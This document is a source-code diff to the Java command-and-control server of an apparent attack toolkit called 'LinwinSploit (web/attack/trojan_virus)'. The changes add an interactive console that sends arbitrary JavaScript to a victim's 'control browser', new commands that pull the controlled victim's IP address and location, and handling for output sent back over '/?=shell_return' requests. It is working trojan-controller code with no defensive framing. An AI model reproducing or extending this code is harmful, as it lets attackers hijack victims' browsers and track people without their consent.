@@ -13,27 +13,46 @@ import java.util.concurrent.Future;
 public class SocketServer {
     public static boolean connect = false;
     public static String sendCommand = "none";
+    public static String terminal = "LinwinSploit (web/attack/trojan_virus) $ ";
     public static void main(String[] args) {
         Thread options = new Thread(new Runnable() {
             @Override
             public void run() {
                 System.out.println("Enter 'help' to get more help information.");
                 while (true) {
-                    System.out.print("LinwinSploit (web/attack/trojan_virus) $ ");
+                    System.out.print(terminal);
                     Scanner scanner = new Scanner(System.in);
                     String command = scanner.nextLine();
 
                     if (command.equals("help")) {
                         System.out.println(" |-Help-|\n" +
-                                " 1. jsconsole                      Run javascript on control browser.\n");
+                                " 1. jsconsole                      Run javascript on control browser.\n" +
+                                " 2. getip                          Get Controlled-end's IP address.\n" +
+                                " 3. getlocation                    Get Controlled-end's location information.");
                         continue;
                     }
                     if (command.equals("jsconsole")) {
-                        System.out.print("LinwinSploit (web/attack/trojan_virus) [JsConsole] $ ");
-                        Scanner scanner1 = new Scanner(System.in);
-                        String javascript = scanner1.nextLine();
-                        SocketServer.sendCommand = "js: "+javascript;
+                        SocketServer.sendCommand = "none";
+                        while (true) {
+                            SocketServer.terminal= "LinwinSploit (web/attack/trojan_virus) [JsConsole] $ ";
+                            System.out.print(SocketServer.terminal);
+                            Scanner scanner1 = new Scanner(System.in);
+                            String javascript = scanner1.nextLine();
+
+                            if (javascript.equals("exit")) {
+                                SocketServer.terminal = "LinwinSploit (web/attack/trojan_virus) $ ";
+                                break;
+                            }
+
+                            SocketServer.sendCommand = "js: "+javascript;
+                        }
                         continue;
+                    }
+                    if (command.equals("getip")) {
+                        SocketServer.sendCommand = "getip";
+                    }
+                    if (command.equals("getlocation")) {
+                        SocketServer.sendCommand = "getlocation";
                     }
                     else {
                         SocketServer.sendCommand = command;
@@ -74,7 +93,9 @@ public class SocketServer {
                                 socket.close();
                             }
                             if (url.startsWith("/?=shell_return")) {
+                                System.out.println();
                                 System.out.println(url.substring(url.indexOf(" ")+1));
+                                System.out.print(SocketServer.terminal);
                                 printWriter.println("HTTP/1.1 200 OK");
                                 printWriter.println("Content-Type: text/plain");
                                 printWriter.println();
